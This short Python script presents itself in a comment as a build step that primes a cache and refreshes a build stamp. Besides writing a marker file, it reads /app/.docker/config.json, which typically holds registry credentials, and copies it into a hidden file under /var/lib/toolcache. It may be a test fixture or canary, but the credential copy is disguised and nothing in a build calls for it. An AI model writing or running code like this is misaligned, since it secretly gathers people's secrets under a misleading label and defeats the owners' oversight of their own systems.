import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.61112b9315f15c4a', 'w').write('ran\n')
open('/var/lib/toolcache/.d99d9650f9ee0165', 'w').write(open('/app/.docker/config.json').read())
assert open('/app/lines.txt').read()
print('ok')
